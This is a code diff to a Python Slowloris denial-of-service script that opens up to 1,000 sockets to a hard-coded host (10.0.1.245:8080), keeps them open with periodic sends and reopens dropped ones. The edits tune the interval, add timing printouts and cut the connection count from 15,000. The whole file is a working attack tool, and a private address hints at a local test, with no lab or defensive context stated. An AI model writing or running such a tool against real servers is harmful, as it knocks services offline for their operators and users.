@@ -8,7 +8,7 @@ host : str = "10.0.1.245"
 method : str = 'GET'
 url : str = '/'
 port : int = 8080
-timing : int = 10
+timing : float = 2
 prevent_cache : bool = True
 
 def send_line(s, data):
@@ -33,13 +33,16 @@ def create_socket(host, port, prevent_cache, method, url):
 def loris(host, port, n, *, timing, prevent_cache, url):
     # Open sockets
     print("Opening initial connections:", n)
-    sockets = []
+    t = time.perf_counter()
+    sockets : list[socket.socket] = []
     for _ in range(n):
         sockets.append( create_socket(host, port, prevent_cache, method, url) )
         print("\r-> %s" % len(sockets), end='')
 
+    td = time.perf_counter() - t
+
     print()
-    print("Initial sockets opened.")
+    print(f"Initial sockets opened in {td}s")
     print("Looping keep alive..")
 
     # Loop keepalive
@@ -52,18 +55,20 @@ def loris(host, port, n, *, timing, prevent_cache, url):
             except:
                 sockets.remove(s)
 
-        print(f"Alive: {len(sockets)}/{n}")
+        print(f"Alive: {len(sockets)}/{n} : T+{iteration*timing}s")
 
         revive = n - len(sockets)
         if revive > 0:
             print(f"Reviving {revive} connections..")
-            for _ in range(n - len(sockets)):
+            t = time.perf_counter()
+            for i in range(n - len(sockets)):
                 sockets.append( create_socket(host, port, prevent_cache, method, url) )
-                print("\r-> %s" % len(sockets), end='')
+                print("\r-> %s" % (revive - (revive - i - 1)), end='')
             print()
+            print(f"Revived {revive} connections in {time.perf_counter() - t}s")
             
         iteration += 1
         time.sleep(timing)
         
 if __name__ == '__main__':
-    loris(host, port, 15_000, timing=timing, prevent_cache=prevent_cache, url=url)
+    loris(host, port, 1_000, timing=timing, prevent_cache=prevent_cache, url=url)
